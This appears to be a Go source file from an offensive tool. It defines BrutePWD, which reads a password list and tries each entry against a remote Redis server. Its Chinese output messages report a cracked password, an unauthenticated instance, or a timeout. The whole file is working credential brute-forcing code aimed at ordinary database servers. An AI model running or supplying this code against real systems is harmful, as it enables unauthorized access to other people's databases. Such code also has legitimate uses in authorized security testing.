package pkg

import (
	"fmt"
	"os"
	"strings"
	"sync"
)

// 爆破密码
func BrutePWD(rhost, rport, filename string) {
	pwds, err := ReadFile(filename)
	if err != nil {
		fmt.Println(err)
		return
	}

	ch := make(chan struct{}, 1)
	var wg sync.WaitGroup

	for _, pass := range pwds {
		wg.Add(1)
		ch <- struct{}{}
		go func(pass string) {
			defer wg.Done()

			err := Connect(rhost, rport, pass)

			if err == nil {
				fmt.Println("成功爆破到 Redis 密码：" + pass)
				os.Exit(0)
			} else if strings.Contains(err.Error(), "ERR Client sent AUTH, but no password is set") {
				fmt.Println("存在未授权 Redis , 不需要输入密码")
				os.Exit(0)
			} else if strings.Contains(err.Error(), "context deadline exceeded") || strings.Contains(err.Error(), "i/o timeout") {
				fmt.Println("Redis 连接超时")
				os.Exit(0)
			}

			<-ch
		}(pass)
	}

	wg.Wait()
	fmt.Println("未发现 Redis 密码")
}
